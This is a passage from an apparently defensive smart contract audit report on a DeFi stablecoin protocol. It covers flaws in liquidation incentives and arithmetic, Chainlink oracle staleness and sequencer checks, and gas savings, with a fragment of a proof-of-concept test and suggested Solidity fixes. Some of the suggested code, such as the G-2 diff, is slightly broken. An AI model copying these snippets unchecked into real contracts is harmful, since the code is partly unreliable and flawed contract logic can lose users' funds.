        vm.startPrank(liquidator);
        dsce.liquidate(weth, user, amountDscToMint);
        vm.stopPrank();

        // The liquidator tries to liquidate $94.5 of Alice's debt, and it will be reverted.
        uint256 maxValueToLiquidate = 94.5e18;
        vm.expectRevert();
        vm.startPrank(liquidator);
        dsce.liquidate(weth, user, maxValueToLiquidate);
        vm.stopPrank();
    }
```

**Recommended Mitigation**:When the health factor is between 100 to 110%, make the liquidation bonus to the maximum possible amount, not the fix amount of `1.1 * liqudationAmount`. You can do that by adding the following code to the `liquidate()` function before calling `_redeemCollateral()`:

```solidity
uint256 totalDepositedCollateral = s_collateralDeposited[user][collateral];
uint256 bonusCollateral = (tokenAmountFromDebtCovered * LIQUIDATION_BONUS) / LIQUIDATION_PRECISION;
uint256 totalCollateralToRedeem = tokenAmountFromDebtCovered + bonusCollateral;
if (tokenAmountFromDebtCovered < totalDepositedCollateral && totalCollateralToRedeem > totalDepositedCollateral) {
    totalCollateralToRedeem = totalDepositedCollateral;
}
```

### [H-3] There is no incentive to liquidate small positions

**Description:** there is no incentive to liquidate low value accounts such as 5$ usd value accounts because of gas cost.Liquidators liquidate users for the profit they can make. If there is no profit to be made than there will be no one to call the liquidate function. For example an account has 6$ worth of collateral and has 4 DSC minted. This user is undercollateralized and must be liquidated in order to ensure that the protocol remains overcollateralized. Because the value of the account is so low, after gas costs, liquidators will not make a profit liquidating this user. In the end these low value accounts will never get liquidating, leaving the protocol with bad debt and can even cause the protocol to be undercollateralized with enough small value accounts being underwater.

**Impact:**The protocol can be undercollateralized potentially not allowing users to redeem their DSC for its value, complete loss of funds.

**Recommended Mitigation**:A potential fix could be to only allow users to mint DSC if their collateral value is past a certain threshold.

### [H-4] Business Logic: Protocol Liquidation Arithmetic

**Description:** The protocol mints a stable coin based on the value of collateral tokens it accepts. The only way to mint this stable coin is through this contract.

To liquidate a users position in order to save the protocol from holding bad debt, the liquidator needs to pay back the dsc owed by the user that has a position at risk.

In order for the liquidator to get this dsc, they would need to mint new dsc from the contract. But the math does not work out.

With a Liquidation Bonus of 10% and an Over Collateralization Rate of 200%, a liquidator will always have their own collateral stuck in the protocol after liquidating a user.

This happens even if the liquidator is able to use the redeemed collateral to mint new dsc and pay back the users debt - should a way for this to be done atomically be available.

This also happens if they are able to purchase it or flashloan it from a dex or other venue prior to calling liquidate.

The math simply does not work.

**Impact:**Liquidators would not call liquidate. The protocol would suffer insolvency in adverse market conditions due to no liquidations taking place.

Furthermore, users after having done their homework may not want to enter the protocol at all due to its design of needing to have all debt returned in dsc - and without other incentives at play, dsc will probably be converted into an alternative token and we will have dsc dust forever in the wild, never to be able to redeem collateral again.

**Recommended Mitigation**:

1. Design some incentives for users to keep using dsc and not sell it, so that they may be able to redeem their collateral.
2. Make the collateralization rate and the liquidation bonus arithmetically incentivised so as to allow re-entrancy for a flash loan type of atomic mint within the protocol.
3. Allow an alternative stable coin to be used for repayment should dsc not be available.
4. Allow a flashmint feature in the Decentralised Stablecoin Contract for no fee, but limited to the value of the redeemed Collateral held at time of flashmint and pay back.

### Medium

#### [M-1] staleCheckLatestRoundData() does not check the status of the Arbitrum sequencer in Chainlink feeds

**Description:** Given that the contract will be deployed on any EVM chain, when utilizing Chainlink in L2 chains like Arbitrum, it's important to ensure that the prices provided are not falsely perceived as fresh particularly in scenarios where the sequencer might be non-operational. Hence, a critical step involves confirming the active status of the sequencer before trusting the data returned by the oracle.

In the event of an Arbitrum Sequencer outage, the oracle data may become outdated, potentially leading to staleness. While the function staleCheckLatestRoundData() provides checks if a price is stale, it does not check if Arbitrum Sequencer is active. Since OracleLib.sol library is used to check the Chainlink Oracle for stale data, it is important to add this verification. You can review Chainlink docs on L2 Sequencer Uptime Feeds for more details on this. https://docs.chain.link/data-feeds/l2-sequencer-feeds

**Impact:** In the scenario where the Arbitrum sequencer experiences an outage, the protocol will enable users to maintain their operations based on the previous (stale) rates.

**Recommended Mitigation**:

There is a code example on Chainlink docs for this scenario: https://docs.chain.link/data-feeds/l2-sequencer-feeds#example-code. For illustrative purposes this can be:

```solidity
function isSequencerAlive() internal view returns (bool) {
    (, int256 answer, uint256 startedAt,,) = sequencer.latestRoundData();
    if (block.timestamp - startedAt <= GRACE_PERIOD_TIME || answer == 1)
        return false;
    return true;
}


function staleCheckLatestRoundData(AggregatorV3Interface priceFeed)
        public
        view
        returns (uint80, int256, uint256, uint256, uint80)
    {
require(isSequencerAlive(), "Sequencer is down");
       ....//remaining parts of the function
```



#### [M-2] DSC protocol can consume stale price data or cannot operate on some EVM chains

**Description:** The stale period (3 hours) is too large for Ethereum, Polygon, BNB, and Optimism chains, leading to consuming stale price data. On the other hand, that period is too small for Arbitrum and Avalanche chains, rendering the DSC protocol unable to operate.

In the `OracleLib` library, the [`TIMEOUT` constant is set to *3 hours*](https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/d1c5501aa79320ca0aeaa73f47f0dbc88c7b77e2/src/libraries/OracleLib.sol#L19). In other words, the `staleCheckLatestRoundData()` would consider the price data fed by Chainlink's price feed aggregators to be stale only after the last update time has elapsed *3 hours*.

Since the DSC protocol supports every EVM chain (confirmed by the client), let's consider the `ETH / USD oracles` on different chains.

- On Ethereum, the oracle will update the price data [every ~1 hour](https://data.chain.link/ethereum/mainnet/crypto-usd/eth-usd).
- On Polygon, the oracle will update the price data [every ~25 seconds](https://data.chain.link/polygon/mainnet/crypto-usd/eth-usd).
- On BNB (BSC), the oracle will update the price data [every ~60 seconds](https://data.chain.link/bsc/mainnet/crypto-usd/eth-usd).
- On Optimism, the oracle will update the price data [every ~20 minutes](https://data.chain.link/optimism/mainnet/crypto-usd/eth-usd).
- On Arbitrum, the oracle will update the price data [every ~24 hours](https://data.chain.link/arbitrum/mainnet/crypto-usd/eth-usd).
- On Avalanche, the oracle will update the price data [every ~24 hours](https://data.chain.link/avalanche/mainnet/crypto-usd/eth-usd).

On some chains such as Ethereum, Polygon, BNB, and Optimism, *3 hours* can be considered too large for the stale period, causing the `staleCheckLatestRoundData()` to return stale price data.

Whereas, on some chains, such as Arbitrum and Avalanche, *3 hours* is too small. Specifically, if the DSC protocol is deployed to Arbitrum or Avalanche, the protocol will be unable to operate because the ["`if (secondsSince > TIMEOUT)`" condition will be met](https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/d1c5501aa79320ca0aeaa73f47f0dbc88c7b77e2/src/libraries/OracleLib.sol#L30), causing a transaction to be reverted in the `staleCheckLatestRoundData()`.

```solidity
    // ...SNIPPED...
	
@>  uint256 private constant TIMEOUT = 3 hours; // 3 * 60 * 60 = 10800 seconds

    function staleCheckLatestRoundData(AggregatorV3Interface priceFeed)
        public
        view
        returns (uint80, int256, uint256, uint256, uint80)
    {
        (uint80 roundId, int256 answer, uint256 startedAt, uint256 updatedAt, uint80 answeredInRound) =
            priceFeed.latestRoundData();

        uint256 secondsSince = block.timestamp - updatedAt;
@>      if (secondsSince > TIMEOUT) revert OracleLib__StalePrice();

        return (roundId, answer, startedAt, updatedAt, answeredInRound);
    }
```

**Impact:**Setting the stale period (`TIMEOUT` constant) too large could lead to incorrect reporting of prices of collateral tokens. The incorrect prices can cause the DSC protocol's functions (e.g., `mintDsc()`, `burnDsc()`, `redeemCollateral()`, and `liquidate()`) to operate incorrectly, affecting the protocol's disruption.

On the other hand, setting the stale period too small could render the DSC protocol unable to operate.

**Recommended Mitigation**:

Even on the same chain, different collateral tokens can have different heartbeats (the period to update the price data on chain). For instance, the heartbeat for the [DAI / USD oracle on Ethereum](https://data.chain.link/ethereum/mainnet/stablecoins/dai-usd) is *~1 hour*, whereas the heartbeat for the [USDT / USD oracle on the same chain](https://data.chain.link/ethereum/mainnet/stablecoins/usdt-usd) is *~24 hours*.

Thus, I recommend using the `mapping` data type to record the `TIMEOUT` parameter of each collateral token and setting each token's `TIMEOUT` with an appropriate stale period.

Furthermore, I also recommend adding a *setter* function for updating the stale period of each specific collateral token.

#### [M-3] Chainlink oracle will return the wrong price if the aggregator hits `minAnswer`

**Description:** Chainlink aggregators have a built-in circuit breaker if the price of an asset goes outside of a predetermined price band.

The result is that if an asset experiences a huge drop in value (i.e. LUNA crash) the price of the oracle will continue to return the `minPrice` instead of the actual price of the asset and vice versa.

The `staleCheckLatestRoundData` function in `OracleLib.sol` is only checking for the stale price. But no checks are done to handle that.

```solidity
 function staleCheckLatestRoundData(AggregatorV3Interface priceFeed)
        public
        view
        returns (uint80, int256, uint256, uint256, uint80)
    {
        (uint80 roundId, int256 answer, uint256 startedAt, uint256 updatedAt, uint80 answeredInRound) =
            priceFeed.latestRoundData();

        uint256 secondsSince = block.timestamp - updatedAt;
        if (secondsSince > TIMEOUT) revert OracleLib__StalePrice();

        return (roundId, answer, startedAt, updatedAt, answeredInRound);
    }
```



There is no function for checking only this as well in the library. The checks are not done in `DSCEngine.sol` file. There are two instances of that:

```solidity
        (, int256 price,,,) = priceFeed.staleCheckLatestRoundData();
```

**Impact:**This would allow users to continue mintDsc, burnDsc etc. but at the wrong price. This is exactly what happened to Venus on BSC when LUNA crashed.

**Recommended Mitigation**:

Consider using the following checks:

```solidity
(uint80, int256 answer, uint, uint, uint80) = oracle.latestRoundData();

// minPrice check
require(answer > minPrice, "Min price exceeded");
// maxPrice check
require(answer < maxPrice, "Max price exceeded");
```

Also some gas could be saved when used `revert` with custom `error` for doing the check.

#### [M-4] Lack of fallbacks for price feed oracle

**Description:**The DSC protocol does not implement fallback solutions for price feed oracle. In case Chainlink's aggregators fail to update price data, the protocol will refuse to liquidate users' positions, leading to the protocol's disruption.

The DSC protocol utilizes the `staleCheckLatestRoundData()` for querying price data of collateral tokens through [Chainlink's price feed aggregators](https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/d1c5501aa79320ca0aeaa73f47f0dbc88c7b77e2/src/libraries/OracleLib.sol#L26-L27). Nonetheless, if Chainlink's aggregators fail to update the price data, the DSC protocol will not be able to operate. In other words, [the function will revert transactions since the received price data become stale](https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/d1c5501aa79320ca0aeaa73f47f0dbc88c7b77e2/src/libraries/OracleLib.sol#L30).

```solidity
    function staleCheckLatestRoundData(AggregatorV3Interface priceFeed)
        public
        view
        returns (uint80, int256, uint256, uint256, uint80)
    {
@>      (uint80 roundId, int256 answer, uint256 startedAt, uint256 updatedAt, uint80 answeredInRound) =
@>          priceFeed.latestRoundData();

        uint256 secondsSince = block.timestamp - updatedAt;
@>      if (secondsSince > TIMEOUT) revert OracleLib__StalePrice();

        return (roundId, answer, startedAt, updatedAt, answeredInRound);
    }
```

**Impact:**Without fallback solutions, the DSC protocol will be unable to operate if Chainlink's aggregators fail to update price data.

Consider the scenario that Chainlink's aggregators fail to update price data and collateral tokens' prices dramatically go down, the DSC protocol will refuse to liquidate users' positions. Consequently, the protocol will become insolvent eventually, leading to the protocol's disruption.

**Recommended Mitigation**:

I recommend implementing fallback solutions, such as using other off-chain oracle providers and/or on-chain Uniswap's TWAP, for feeding price data in case Chainlink's aggregators fail.



### Gas Optimizations / Informationals

#### [G-1] using x=x+y /x=x-y is more gas efficient than x+=y / x-=y

**Description:** using x=x+y /x=x-y is more gas efficient than x+=y / x-=y

```solidity
totalCollateralValueInUsd += getUsdValue(token, amount);
```

**Recommended Mitigation:** 

use x=x-y and x=x+y

```solidity
totalCollateralValueInUsd = totalCollateralValueInUsd + getUsdValue(token, amount);
```

#### [G-2] Remove unused variables in `OracleLib`

**Description:** Currently `OracleLib.staleCheckLatestRoundData()` returns 4 variables `(uint80 roundId, int256 answer, uint256 startedAt, uint256 updatedAt, uint80 answeredInRound)` which are returned from `latestRoundData()`

In the current implementation, only `answer` variable is used. By removing all the unused properties in both library and at the places where library method is used we will save roughly 400 gas.

**Recommended Mitigation:** 

Updated OracleLib

```solidity
library OracleLib 

function staleCheckLatestRoundData(AggregatorV3Interface priceFeed)
    public
    view
    - returns (uint80, int256, uint256, uint256, uint80)
	+ returns (int256)
{
    - (uint80 roundId, int256 answer, uint256 startedAt, uint256 updatedAt, uint80 answeredInRound) =
        priceFeed.latestRoundData();
	+ (, int256 answer,, uint256 updatedAt,) = priceFeed.latestRoundData();

    uint256 secondsSince = block.timestamp - updatedAt;
    if (secondsSince > TIMEOUT) revert OracleLib__StalePrice();

    - return (roundId, answer, startedAt, updatedAt, answeredInRound);
	+ return (answer);
}
```

```solidity
contract DSCEngine

function getUsdValue(address token, uint256 amount) public view returns (uint256) {
    AggregatorV3Interface priceFeed = AggregatorV3Interface(s_priceFeeds[token]);
	- (, int256 price,,,) = priceFeed.staleCheckLatestRoundData();
    + int256 price = priceFeed.staleCheckLatestRoundData();
    // 1 ETH = $1000
    // The returned value from CL will be 1000 * 1e8е
    return ((uint256(price) * ADDITIONAL_FEED_PRECISION) * amount) / PRECISION;
}
```

```solidity
contract DSCEngine

function getTokenAmountFromUsd(address token, uint256 usdAmountInWei) public view returns (uint256) {
    // price of ETH (token)
    // $/ETH ETH ??
    // $2000 / ETH. $1000 = 0.5 ETH
    AggregatorV3Interface priceFeed = AggregatorV3Interface(s_priceFeeds[token]);
    - (, int256 price,,,) = priceFeed.staleCheckLatestRoundData();
	+ int256 price = priceFeed.staleCheckLatestRoundData();
    // ($10e18 * 1e18) / ($2000e8 * 1e10)
    return (usdAmountInWei * PRECISION) / (uint256(price) * ADDITIONAL_FEED_PRECISION);
}
```

#### [G-3] `burn()` and `staleCheckLatestRoundData()` and `getTimeout()` can be `external`

**Description:**`burn()` in `DecentralizedStableCoin.sol` and `staleCheckLatestRoundData()` and `getTimeout()` in `OracleLib.sol` aren't called inside the contract and thus can be set to `external`.

**Impact**:Useless gas consumption.

**Recommendations: **Set the functions to `external` to save gas.
